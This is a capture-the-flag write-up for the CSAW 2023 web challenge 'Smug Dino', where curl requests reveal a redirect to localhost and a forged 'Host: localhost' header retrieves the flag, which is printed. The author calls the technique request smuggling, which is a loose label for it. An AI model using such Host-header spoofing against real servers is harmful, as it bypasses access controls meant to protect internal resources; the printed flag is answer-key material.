---
title: "[CSAWCTF2023] Smug Dino"
date: "18 September 2023"
toc: false
images:
author: "KS"
origsrc: ""
category: "WEB"
tags:
  - WEB
  - CSAWCTF
  - 2023
---

This challenge was first solved by one of our member **Shen**. I only managed to solved after looking into the brief writeup provided by him. After understanding this challenge, I decided to solve this challenge with just `curl` command.

There is only a link given for this challenge. Since it is a web challenge, I started out by playing around with the web application.

```bash
curl -v http://web.csaw.io:3009/
* processing: http://web.csaw.io:3009/
*   Trying 44.218.164.132:3009...
* Connected to web.csaw.io (44.218.164.132) port 3009
> GET / HTTP/1.1
> Host: web.csaw.io:3009
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.17.6
< Date: Sun, 17 Sep 2023 13:44:31 GMT
< Content-Type: text/html; charset=utf-8
< Content-Length: 1952
< Connection: keep-alive
< X-Powered-By: Express
< ETag: W/"7a0-qKx6Ou+8z9np0jE0RYCSKOhMytk"
< Set-Cookie: connect.sid=s%3ADoXqd65AqDw7qnAuvYjr9ax9Yazp2PB7.BomOa3aonqfdU8lisF0Wwy3DLiJlNT2oPoc74zRquGQ; Path=/; HttpOnly
<
<!DOCTYPE html>
<html lang="en">

<head>
    <title>All about dinos :) </title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css" integrity="sha384-MCw98/SFnGE8fJT3GXwEOngsV7Zt27NXFoaoApmYm81iuXoPkFOJwJ8ERdknLPMO" crossorigin="anonymous">
    <link href="css/styles.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Merriweather:400,700" rel="stylesheet" type="text/css">
</head>

<body>
    <nav class="navbar navbar-dark bg-dark navbar-static-top navbar-expand-md">
        <div class="container">
            <button type="button" class="navbar-toggler collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1" aria-expanded="false"> <span class="sr-only">Toggle navigation</span>
            </button> <a class="navbar-brand" href="#">Smug Dino</a>
            <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                <ul class="nav navbar-nav mr-auto">
                    <li class="active nav-item"><a href="/" class="nav-link">Home</a>
                    </li>
                    <li class="nav-item"><a href="/hint" class="nav-link">Hint</a>
                    </li>
                    <li class="nav-item"><a href="/flag" class="nav-link">Flag?</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    <div class="jumbotron">
        <div class="container">
            <h1>What's your favorite dinosuar?</h1>
            <h5>Ancient artifacts can teach us a lot -- just don't have them in your code!</h5>
            <div style="max-height:450px; max-width:450px; overflow: hidden">
                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Lambeosaurus_magnicristatus_DB.jpg">
           </div>
            <br>
        </div>
    </div>
</body>
</html>
* Connection #0 to host web.csaw.io left intact
```

Based on the result, I noticed that there is a `href=/flag`. Since the web application is referring to flag page, I decided to look into it and hope that it is not a rabbit hole.

```bash
 curl -v http://web.csaw.io:3009/flag
* processing: http://web.csaw.io:3009/flag
*   Trying 44.218.164.132:3009...
* Connected to web.csaw.io (44.218.164.132) port 3009
> GET /flag HTTP/1.1
> Host: web.csaw.io:3009
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 302 Moved Temporarily
< Server: nginx/1.17.6
< Date: Mon, 18 Sep 2023 13:36:04 GMT
< Content-Type: text/html
< Content-Length: 145
< Connection: keep-alive
< Location: http://localhost:3009/flag.txt
<
<html>
<head><title>302 Found</title></head>
<body>
<center><h1>302 Found</h1></center>
<hr><center>nginx/1.17.6</center>
</body>
</html>
* Connection #0 to host web.csaw.io left intact
```

After looking into the flag page, I noticed that the status code is 302 which means that the flag page has been moved to another places. After investigating the header, I found something interesting which is `Location: http://localhost:3009/flag.txt`. Since the status code is 302 and the location is referring to localhost, I could just perform HTTP request smuggling by providing a custom header that mentioned that it is localhost.

```bash
curl -v http://web.csaw.io:3009/flag.txt -H 'Host:localhost:3009'
* processing: http://web.csaw.io:3009/flag.txt
*   Trying 44.218.164.132:3009...
* Connected to web.csaw.io (44.218.164.132) port 3009
> GET /flag.txt HTTP/1.1
> Host:localhost:3009
> User-Agent: curl/8.2.1
> Accept: */*
>
< HTTP/1.1 200 OK
< Server: nginx/1.17.6
< Date: Mon, 18 Sep 2023 13:40:17 GMT
< Content-Type: text/plain
< Content-Length: 29
< Connection: keep-alive
<
* Connection #0 to host web.csaw.io left intact
csawctf{d0nt_smuggl3_Fla6s_!}
```

### Flag

```
csawctf{d0nt_smuggl3_Fla6s_!}
```